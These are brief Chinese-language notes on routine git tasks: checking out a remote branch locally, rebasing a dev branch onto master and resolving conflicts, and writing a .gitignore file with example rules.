使用git switch -c <branch> origin/<branch>，本地和远程分支的名称最好一致

切换分支到需要rebase的分支，这里是dev分支

执行git rebase master，有冲突就解决冲突，解决后直接git add . 再git rebase --continue即可

命令行输入touch .gitignore
生成 .gitignore 文件；
在文件中输入过滤信息，过滤规则如下：
node_modules/   表示过滤这个文件夹
*.zip   过滤zip后缀文件
demo.html   过滤该文件


